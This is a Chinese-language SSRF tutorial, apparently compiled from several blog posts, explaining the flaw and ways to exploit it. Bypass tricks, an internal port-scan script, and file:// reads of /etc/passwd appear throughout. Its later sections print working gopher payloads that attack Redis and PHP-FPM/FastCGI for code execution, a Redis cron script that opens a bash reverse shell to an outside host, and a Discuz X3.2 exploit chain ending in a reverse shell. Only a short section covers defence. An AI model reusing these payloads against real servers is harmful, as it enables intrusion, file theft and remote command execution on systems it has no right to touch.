## 什么是SSRF

> 创建: 未知 | 更新: 2026-05-21 | 适用: PHP通用 (curl/file_get_contents) | ⚠️ 部分图片托管于外部CDN

SSRF(Server-Side Request Forgery,服务器请求伪造)是一种由攻击者构造请求,由服务端发起请求的安全漏洞,

一般情况下,SSRF攻击的目标是外网无法访问的内网系统(正因为请求时由服务端发起的,所以服务端能请求到与自身相连而与外网隔绝的内部系统)。

SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。

例如,黑客操作服务端从指定URL地址获取网页文本内容,加载指定地址的图片等,利用的是服务端的请求伪造,SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。

除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。

## SSRF的分类

- 显示对攻击者的响应(Basic)
- 不显示响应(Blind)

其中Basic的回显响应最容易利用并且危害较大，一旦确认存在SSRF漏洞，攻击者就可能利用该漏洞对内网进行探测等。

## SSRF怎么挖掘

重点关注Web系统上的以下功能：

1. 分享：通过URL地址进行的网页内容分享
2. 转码服务：通过URL地址将原地址的网页内容调整为自适应设备的浏览页面
3. 在线翻译：通过URL地址翻译对应的网页文本内容
4. 图片加载与下载：通过URL地址加载或下载图片
5. 收藏功能：对图片或文章的收藏功能
6. 可能的URL调用：可能存在的URL调用
7. 离线下载：从URL下载文件后再传输给用户

在实际寻找时，可以考虑使用搜索引擎检索以下字段：

1. share
2. wap
3. url
4. link
5. src
6. source
7. target
8. u
9. 3g
10. display
11. sourceURL
12. imageURL
13. domain
14. downloadURL
15. externalURL

等等。

## SSRF漏洞的绕过

在确认存在SSRF漏洞存在后，可能由于WAF等原因，需要进行绕过，以下为一些常用的绕过技巧：

1. 对于内网探测，如果拦截了127.0.0.1或者localhost，可以考虑使用[::]
2. 使用@符绕过，例如[http://baidu.com@127.0.0.1，其意为使用baidu.com的用户登录127.0.0.1，实际地址为127.0.0.1](http://baidu.com@127.0.0.xn--1,baidu-g73kl8gx3g745cco0c.xn--com127-rz2ln4q4v3c50c0c.0.0.xn--1,127-fq1hh94cxd605b901m.0.0.1/)
3. 使用指向任意IP的域名xip.io，例如10.0.0.1.xip.io指向10.0.0.1
4. 特殊进制绕过，可以将IP地址改为各种进制进行绕过，例如192.168.0.1
   - 八进制：0300.0250.0.1
   - 十六进制：0xC0.0xA8.0.1或整数形式的0xC0A80001(写成整数形式注意对齐)
   - 十进制：3232235521
5. DNS解析，设置域名的A记录为127.0.0.1等
6. 利用句号，例如127。0。0。1实际和127.0.0.1一样
7. 对于先检测域名再进行实际请求的，可以考虑使用DNS Rebinding(域名重绑定)技术进行绕过
8. SSRF可利用的协议：
   - file协议，可读取文件
   - dict协议，当无法使用gopher协议时可以考虑使用该协议探测内网甚至写Shell
   - gopher协议，该协议可发送Get、POST请求
   - ldap协议
   - sftp与tftp

## SSRF的利用方式

1. 在外网就可以对服务器所在的内网进行端口扫描获取内网资产信息，甚至对内网进行测绘，得到完整的内网拓扑
2. 大多数企业对于内网过于信任，对于内网的一些App没有进行安全保护，从而可以攻击内网的应用程序
3. 对内网的Web系统等进行指纹识别(通过获取一些默认文件进行判断)
4. 读取敏感文件

## SSRF的防御

对于安全来说，怎么复杂都不为过，以下为参考的一些防御方式：

1. 过滤返回信息。例如接口的功能是翻译HTML文档中的文字，那么在返回时就检查响应是否为HTML格式，如果不是，那么就拒绝返回。
2. 统一化错误信息，从而避免用户可以通过错误信息来判断内网状态。例如，当127.0.0.1:3306无法连接时，不要直接返回该端口无法连接，而是直接向用户表示出错，但不表示具体为何类错误。
3. 限制请求的端口，例如只是下载HTML文档，限制端口为80与443。
4. 内网黑名单，采用更为严格的限制，禁止访问内网服务
5. 严格白名单，只允许访问部分支持的URL
6. 禁用无关协议，例如下载服务，仅提供HTTP、HTTPS、FTP等协议即可，禁用dict、gopher、file协议等。

# 0x01 SSRF漏洞介绍

`SSRF`(Server Side Request Forgery，服务端请求伪造)，是攻击者通过构造数据进而伪造服务器端发请求的漏洞。
形成的原因多是服务器端提供了从外部服务可以获取数据的功能，但是对发起请求的来源进行验证过滤，导致攻击者可以自由构造参数，获取预期外的请求。

## SSRF原理解析

URL结构如下

```
URI = schema:[//authority]path[?query][#fragment]
```

[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/1.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/1.png)

- `userinfo` 通常用于**身份**验证，`root:passwd`，以`@`结尾
- `host`就是经常说的主机名，如`baidu.com`
- `port`为服务器端口
- `path`是资源路径
- `query`是请求参数，`?id=1&username=root`
- `fragment`是片段ID，位于`#`后面，不会被传递到服务器端，用于页面定位

本地搭建SSRF简单测试环境

```
$url = $_GET['url'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$res = curl_exec($ch);
header("content-type: image/png");
curl_close($ch);
echo $res;
```

## SSRF漏洞存在的位置

SSRF一般出现在有调用外部资源的场景中，比如社交服务分享功能、图片识别服务等等
常用协议：

1. `file://` 从文件系统中读取文件内容，例如file://etc/passwd
2. `dict://` 字典服务器协议，让客户端能访问更多字典源。在SSRF中可以获得目标服务器上的服务版本等信息
3. `gopher://`分布式的文档传递服务，在SSRF发挥作用很大，攻击面很广！

# 0x02 SSRF漏洞利用方式

## 内部服务资产探测

可以写python脚本根据请求之后的返回信息进行判断服务开放情况

```
# encoding = utf-8
import requests as req
import time
ports = ['80','3306','6379','8080','8000']
session = req.Session()
for i in xrange(255):
	ip = '192.168.78.{}'.format(i)
	for port in ports:
		url = "http://example.com/?url=http://{}.{}".format(ip,port)
		try:
			res = session.get(url,timeout=3)
			if len(res.content) > 0:
				print(ip,port,'is open')
		except:
			continue
print("DONE")
```

## SSRF的bypass

在ctf中，有时候会ban一些指定的ip，比如127.0.0.1，有时候是检查一整段127.0.0.1，或者是通过正则去匹配逐个字符，这里介绍一下如何去绕过这些WAF。

- 302跳转

有一种网站地址是当访问任意子域名时，都会重定向到这个子域名
比如当访问`http://127.0.0.1.xip.io/test.php`最后会跳转到`http://127.0.0.1/test.php`
[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/2.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/2.png)
[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/3.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/3.png)
实现跳转
可用网站：

1. `xip.io`
2. `nip.io`
3. `sslip.io`

这种方法适用于后端用`parse_url`判断host参数是否等于`127.0.0.1`或者`localhost`，但是如果检查是否存在关键字`127.0.0.1`，这种方法就不行，需要使用短地址绕过
可用网站：
`4m.cn`
[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/4.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/4.png)

- 进制转换绕过过滤

可以将ip地址转换为不同进制绕过waf，提供一个脚本

```
<?php
$ip = '127.0.0.1';
$ip = explode('.',$ip);
$r = ($ip[0] << 24) | ($ip[1] << 16) | ($ip[2] << 8) | $ip[3] ;
if($r < 0) {
    $r += 4294967296;
}
echo "十进制:";
echo $r;
echo "八进制:";
echo decoct($r);
echo "十六进制:";
echo dechex($r);
?>
```

结果：

```
十进制:2130706433八进制:17700000001十六进制:7f000001
```

实际使用中要在八进制前面加`0`,十六进制前面加`0x`

- 利用DNS解析

可以用自己的域名，可以将域名设置A记录指向127.0.0.1

- 利用@绕过

请求`http://www.baidu.com@127.0.0.1/index.php`和请求`http://127.0.0.1/index.php`效果是一样的

- 各种指向127.0.0.0的地址

1. http://localhost/
2. [http://0/](http://0.0.0.0/)
3. http://[0:0:0:0:0:ffff:127.0.0.1]/
4. http://[::]:80/
5. [http://127。0。0。1/](http://127.0.0.1/)
6. http://①②⑦.⓪.⓪.①
7. [http://127.1/](http://127.0.0.1/)
8. [http://127.00000.00000.001/](http://127.0.0.1/)
9. file:/etc/passwd
10. file:(空格)//

第1行localhost就是代指127.0.0.1

第2行中0在window下代表0.0.0.0，而在liunx下代表127.0.0.1

第3行指向127.0.0.1，在liunx下可用，window测试了下不行

第4行指向127.0.0.1，在liunx下可用，window测试了下不行

第5行用中文句号绕过

第6行用的是Enclosed alphanumerics方法绕过，英文字母以及其他一些可以网上找找

第7.8行中0的数量多一点少一点都没影响，最后还是会指向127.0.0.1

第9.10行可以绕过`file://`协议过滤

- 不存在协议头的绕过

`file_get_contents()`函数会将不认识的伪协议头当做文件夹，造成跨目录读取文件的漏洞
php_error.logs内容
[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/5.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/5.png)
构造payload读取php_error.logs
[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/6.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/6.png)
可利用的payload

1. httpsssss://../../../../../../etc/passwd
2. httpsssss://abc../../../../../../etc/passwd

- URL解析问题

parse_url和readfile的区别
[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/7.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/7.png)
[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/8.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/8.png)
curl和parse_url解析的差异
[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/9.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/9.png)
更多参考blackhathttps://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

# SSRF进阶用法

## 对redis和mysql的攻击

使用工具Gopherushttps://github.com/tarunkant/Gopherus

- 对redis的攻击

[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/10.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/10.png)
**Tips**：如果是在url中输入payload的话还要讲payload再url编码一次

- 对Mysql的攻击

[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/11.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/11.png)
题目：ISITDTU 2018 Friss
复现过程：https://xz.aliyun.com/t/2500

## 使用PHP-FPM攻击

首先，PHP-FPM是实现和管理FastCGI的进程，是一个FastCGI协议解析器，而Fastcgi本质是一个通信协议，类似于HTTP，都是进行数据交换的一个通道，通信过程如下：

TCP模式下在本机监听一个端口（默认为9000），Nginx把客户端数据通过FastCGI协议传给9000端口，PHP-FPM拿到数据后会调用CGI进程解析。

而PHP-FPM攻击是通过伪造FastCGI协议包实现PHP代码执行，我们可以通过更改配置信息来执行任意代码。php中有两个非常有趣的配置项，分别为`auto_prepend_file`和`auto_append_file`，这两个配置项是使得php在执行目标文件之前，先包含配置项中指定的文件，如果我们把`auto_prepend_file`或`auto_append_file`的值设定为`php://input`，就能包含进POST提交的数据。

但是这里有个问题就是`php://input`需要开启`allow_url_include`，这里可以利用`PHP_ADMIN_VALUE`，上一篇说到`PHP_ADMIN_VALUE`不可以利用在`.htaccess`，但是FastCGI协议中`PHP_ADMIN_VALUE`却用来可以修改大部分的配置，我们利用`PHP_ADMIN_VALUE`把`allow_url_include`修改为True。

利用过程：

1. 监听本地1234端口(可以任意指定)并写入ssrf.txt
   [![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/12.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/12.png)

2. 使用p牛的脚本生成payload
   https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
   [![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/13.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/13.png)
   这里的php是随便一个php都可以，攻击网站服务的话最好是使用`/var/www/html/`下的php文件
   可以使用`find / -name *.php`来找php文件

3. payload进行url编码

   脚本

   ```
   import urllib.parse
   f = open(r'ssrf.txt','rb')
   s = f.read()
   s = urllib.parse.quote(s)
   s = urllib.parse.quote(s)
   print("gopher://127.0.0.1:1234/_"+s)
   ```

   ![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/14.png)

最终payload：

```
gopher://127.0.0.1:9000/_%2501%2501u%2589%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504u%2589%2501%25DB%2500%2500%2511%250BGATEWAY_INTERFACEFastCGI/1.0%250E%2504REQUEST_METHODPOST%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250B%2517SCRIPT_NAME/var/www/html/index.php%250C%2500QUERY_STRING%250B%2517REQUEST_URI/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%250F%250ESERVER_SOFTWAREphp/fcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250B%2504REMOTE_PORT9985%250B%2509SERVER_ADDR127.0.0.1%250B%2502SERVER_PORT80%250B%2509SERVER_NAMElocalhost%250F%2508SERVER_PROTOCOLHTTP/1.1%250C%2510CONTENT_TYPEapplication/text%250E%2502CONTENT_LENGTH21%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A//input%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%2501%2504u%2589%2500%2500%2500%2500%2501%2505u%2589%2500%2515%2500%2500%253C%253Fphp%2520system%2528%2522ls%2522%2529%253B%253F%253E%2501%2505u%2589%2500%2500%2500%2500
```

按照需求更改ip地址和端口使用`PHP-FPM`进行攻击

[![image-20210901113833100](https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210901113833100.png)](https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210901113833100.png)

## Gopher发送请求

SSRF漏洞是服务端请求伪造攻击，不论是GET或者是POST方法，都是为了达到一个目的，就是让服务端帮我们来执行请求。

那么在CTF中什么情况需要利用到这种方法呢，比如发现了一个内网的应用有上传的功能，我们需要通过POST提交数据，而且Gopher协议没有被ban，我们就可以考虑构造一个请求去打内网，下面先从本地看看如何构造：

通常，我们可以利用gopher://协议可以用来发送Get和Post请求，需要注意的点是要对发送的请求头中的空格和一些特殊字符进行url编码，如果是在URL中提交payload的时侯要再进行一次url编码，先来看看如何发送简单的请求。

- POST 请求

首先在Ubuntu(192.168.78.129)中写入1.php

```
<?php
echo "Hello".$_POST['a'];
?>
```

然后浏览器请求192.168.78.129/1.php,并且post数据上去,要加上`Content-Type`和`Content-Length`
[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/15.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/15.png)
然后用脚本对空格和特殊字符进行url编码，换行的地方换成%0D%0A

```
import urllib
import requests
test =\
"""POST /1.php HTTP/1.1
Host: 192.168.0.102
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

a=world
"""
tmp = urllib.parse.quote(test)
new = tmp.replace('%0A','%0D%0A')
result = '_'+new
print(result)
```

请求体换成自己的，然后在前面加上gopher协议头和IP地址&端口

```
gopher://192.168.78.129:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.78.129%0D%0AContent-Length%3A%208%0D%0ACache-Control%3A%20max-age%3D0%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0AOrigin%3A%20http%3A//192.168.78.129%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/87.0.4280.66%20Safari/537.36%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8%2Capplication/signed-exchange%3Bv%3Db3%3Bq%3D0.9%0D%0AReferer%3A%20http%3A//192.168.78.129/1.php%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.9%0D%0ACookie%3A%20PHPSESSID%3D0mc9vnie822adc7vqclbj8mku3%3B%20zbx_sessionid%3D6a39e22add94af9fbecb3a4ea2572360%3B%20pma_lang%3Dzh_CN%3B%20pma_collation_connection%3Dutf8_unicode_ci%3B%20pma_console_height%3D92%3B%20pma_console_config%3D%257B%2522alwaysExpand%2522%253Afalse%252C%2522startHistory%2522%253Afalse%252C%2522currentQuery%2522%253Atrue%257D%3B%20pma_console_mode%3Dcollapse%3B%20pma_iv-1%3DkbQHRcwPzBE4G5oc3a%252BJKA%253D%253D%3B%20pmaUser-1%3DmNweCSS5IkoOEEEDsjIYqA%253D%253D%3B%20pmaPass-1%3DwItp0q5TNA4L055vSPGmiQ%253D%253D%3B%20phpMyAdmin%3D4ebe720ca411e37ca577dfca29c642ae%0D%0AConnection%3A%20close%0D%0A%0D%0Aa%3D123456%0D%0A
```

在Linux的Shell下面请求，Windows不成功
[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/16.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/16.png)
这算是我们直接请求1.php,SSRF的情况是我们只能通过一台对目标网站有访问权限的机器对资源进行请求，我们本身没有权限

下面在Ubuntu内写入ssrf.php

```
<?php
function curl($url){
  //创建一个新的curl资源
  $ch = curl_init();
  //设置URL和相应的选项
  curl_setopt($ch,CURLOPT_URL,$url);
  curl_setopt($ch,CURLOPT_HEADER,false);
  //抓取URL并把它传递给浏览器
  curl_exec($ch);
  //关闭curl资源，并且释放系统资源
  curl_close($ch);
}
$url = $_GET['url'];
curl($url);
?>
```

需要提前安装好php和php7.0-curl
直接将我们上面的payload通过url传进去是没有回显的，得再次url编码,如果是post的话就不用
[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/17.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/17.png)

**发送get请求的方法一样**

## DNS-rebinding

有时候ssrf的过滤中会出现这种情况，通过对传入的url提取出host地址，然后进行dns解析，获取ip地址，然后对ip地址进行检验，如果合法再利用curl请求的时候会发起第二次请求。

DNS-rebinding就是利用第一次请求的时候解析的是合法的地址，而第二次解析的时候是恶意的地址，这个技术已经被广泛用于bypass同源策略，绕过ssrf的过滤等等。

利用过程：

首先需要拥有一个域名，然后添加两条记录类型为A的域名解析，一条的记录值为127.0.0.

在自己的域名下面添加一条指向`127.0.0.1`的A记录，这样会随机返回解析出来的ip地址

没有域名就去http://ceye.io/

[![img](https://hackerqwq.github.io/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/18.png)](https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/18.png)

## 0x00 SSRF简介

SSRF（Server-Side Request Forgery ）:服务器端请求伪造，利用漏洞可以伪造服务器端发起网络请求，从而达到攻击内网的目的。

简单来说就是，接受客户端传来的URL，然后服务器拿URL去请求，然后返回ge给客户端

## 0x01 主要危害

- 内外网的端口和服务扫描（banner信息，主动扫描）
- 主机本地敏感数据的读取（利用file协议读文件）
- 内外网主机应用程序漏洞的利用（比如溢出）
- 内外网Web站点漏洞的利用（主要是使用get参数的攻击）
- 无视CDN (ssrf+gopher =ssrfsocks)
- …….

## 0x02 产生原因

网站访问大概步骤：

> 用户在地址栏输入网址 –》 向目标网站发送请求 –》 目标网站接受请求并在服务器端验证请求是否合法，然后返回用户所需要的页面 –》 用户接受页面并在浏览器中显示

假如【此处的请求默认为: [www.xxx.com/ssrf.php?url=】](http://www.xxx.com/ssrf.php?url=】)

产生SSRF的漏洞的环节就处在，服务器端的验证并没有对其请求url的参数做出严格的过滤以及限制，导致服务器以他的身份来访问其他服务器的资源。

## 0x03 漏洞代码

### curl_exec()

```
<?php
        $URL = $_GET['url'];
        //初始化一个curl会话
        $CH = CURL_INIT();
        //设置url
        CURL_SETOPT($CH, CURLOPT_URL, $URL);
        //设置header
        CURL_SETOPT($CH, CURLOPT_HEADER, FALSE);
        //设置curl参数，要求结果保存到字符串中还是输出到屏幕上
        CURL_SETOPT($CH, CURLOPT_RETURNTRANSFER, TRUE);
        //curL将终止从服务端进行验证
        CURL_SETOPT($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
        //curl返回"Location: "允许302跳转
       	CURL_SETOPT($CH, CURLOPT_FOLLOWLOCATION, TRUE);
        //执行一个curl会话,请求网页
        $RES = CURL_EXEC($CH);
        //设置头信息
        HEADER('CONTENT-TYPE IMAGEPNG');
        CURL_CLOSE($CH) ;
        //返回响应
        ECHO $RES;		
?>
```

上述代码，服务器端使用curl发起网络请求加载图片然后返回给客户端

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/img.png)](https://yoga7xm.top/2018/11/15/ssrf-study/img.png)

此处libcurl库支持多种协议

> [root@4f44e990a2d9 ~]# curl -V
> curl 7.53.0 (x86_64-pc-linux-gnu) libcurl/7.62.0
> Protocols: dict file ftp gopher http imap pop3 rtsp smtp telnet tftp
> Features: AsynchDNS IPv6 Largefile UnixSockets

### file_get_contents()

漏洞代码：

```
$url = $_GET['url'];
echo file_get_contents($url);
```

服务器端使用file_get_contents()从用户指定的URL参数去发送请求结果返回至用户，同样，未对用户提供的URL进行验证，参数可控，存在ssrf漏洞

### fsockopen ()

```
<?php 
function GetFile($host,$port,$link) 
{ 
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); 
    if (!$fp) { 
	echo "$errstr (error number $errno) \n"; 
        } else { 
    $out = "GET $link HTTP/1.1\r\n"; 
    $out .= "Host: $host\r\n"; 
    $out .= "Connection: Close\r\n\r\n"; 
    $out .= "\r\n"; 
    fwrite($fp, $out); 
    $contents=''; 
    while (!feof($fp)) { 
    $contents.= fgets($fp, 1024); 
	} 
    fclose($fp); 
    return $contents; 
	} 
}
?>
```

这段代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。

以上函数使用不当，就会产生漏洞。

## 0x04 利用方式

### FILE协议：

获取敏感文件 `url=file:///etc/passwd`

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/file.png)](https://yoga7xm.top/2018/11/15/ssrf-study/file.png)

### SFTP协议：

获取ssh banner信息 `url=sftp://www.mywebsite.com:1234/`

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/ssh_banner.png)](https://yoga7xm.top/2018/11/15/ssrf-study/ssh_banner.png)

### DICT协议：

获取curllib库 banner 信息 `dict://www.mywebsite.com:1234/`

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/curl_banner.png)](https://yoga7xm.top/2018/11/15/ssrf-study/curl_banner.png)

泄露安装软件版本信息，还可以查看端口，操作内网redis服务等 `dict://127.0.0.1:3306/`

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/banner.png)](https://yoga7xm.top/2018/11/15/ssrf-study/banner.png)

### GOPHER协议 （万能协议）：

> Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的[文件组织](https://baike.baidu.com/item/文件组织)成某种索引，很方便地将用户从Internet的一处带到另一处。允许用户使用层叠结构的菜单与文件，以发现和检索信息，它拥有世界上最大、最神奇的编目。 ——百度百科

#### 攻击Redis：

利用dict协议 `url=dict://127.0.0.1:6379/info`可以查看redis的配置信息

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/info.png)](https://yoga7xm.top/2018/11/15/ssrf-study/info.png)

redis反弹shell的脚本如下：

```
echo -e "\n\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.1.166/2345 0>&1\n\n\n"|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/
redis-cli -h $1 -p $2 config set dbfilename root
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
```

其脚本在redis中写了一个键值对然后利用`cron`写了一个反弹shell的定时计划（每分钟执行一次）。

然后得利用数据抓包工具`socat`分析流量，然后改成适配gopher协议的URL格式

这部分三叶草一个大佬分析的很详细[ssrf in php](http://joychou.org/index.php/web/phpssrf.html) ，这里利用师傅的Exp：

```
curl -v 'gopher://127.0.0.1:9000/_%01%01%16%21%00%08%00%00%00%01%00%00%00%00%00%00%01%04%16%21%01%E7%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/nginx/html/p.php%0B%1BSCRIPT_NAME/usr/local/nginx/html/p.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/nginx/html/p.php%01%04%16%21%00%00%00%00%01%05%16%21%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05%16%21%00%00%00%00'
```

最终获得shell。

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/shell.png)](https://yoga7xm.top/2018/11/15/ssrf-study/shell.png)

#### 攻击FastCGI：

> FastCGI全称快速通用网关接口 ，HTTP服务器与你的或其它机器上的程序进行“交谈”的一种工具，其程序一般运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和 环境变量。

一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。

利用条件：

> - libcurl版本>=7.45.0
> - PHP-FPM监听端口
> - PHP-FPM版本 >= 5.3.3
> - 知道网站文件的绝对路径
> - 由于EXP里有%00，CURL版本小于7.45.0的版本，gopher的%00会被截断

除此之外，Gopher协议还能攻击内部存在漏洞的应用，比如JBoss、Struts、memcache等

## 0x05 实例

### Discuz!

Discuz X3.2 存在 SSRF 漏洞，当服务器开启了 Gopher wrapper 时，可以进行一系列的攻击。

> 漏洞分析：https://www.seebug.org/vuldb/ssvid-91879
>
> dockerfile及poc： https://github.com/C1tas/DiscuzX3.2_SSRF_EXP

**测试漏洞poc：**

```
http://192.168.43.73:8082/Discuz/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://192.168.43.73/test.php?a.jpg[/img]
```

远程VPS中`test.php`

```
<?php                                                                         
	header("Location: gopher://192.168.43.73:2333/_test");
?>
```

打开监听端口，回显`test` 说明说明存在漏洞

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/test.png)](https://yoga7xm.top/2018/11/15/ssrf-study/test.png)

构造FastCGI的Exp

```
<?php
header("Location: gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/127.0.0.1/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00");
?>
```

然后请求URL

```
http://127.0.0.1:8899/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://127.0.0.1:9999/1.php?a.jpg[/img]
```

可在本地2333端口收到反弹shell

**利用`PocSuite+Discuz_SSRF_Redis.py`**

> PocSuite是一款基于漏洞与 PoC的远程漏洞验证框架，是知道创宇的安全团队开发的。
>
> 在使用Pocsuite的时候，我们可以用`--verify`参数来调用`_verify`方法，用`--attack`参数来调用`_attack`方法

```
python2.7 pocsuite.py -r ../Discuz_SSRF_Redis.py -u http://192.168.1.166:8082/Discuz/forum.php --verify
```

[![img](https://yoga7xm.top/2018/11/15/ssrf-study/verify.png)](https://yoga7xm.top/2018/11/15/ssrf-study/verify.png)

```
python pocsuite.py -r ../Discuz_SSRF_Redis.py -u http://192.168.1.166:8082/Discuz/forum.php --attack
```

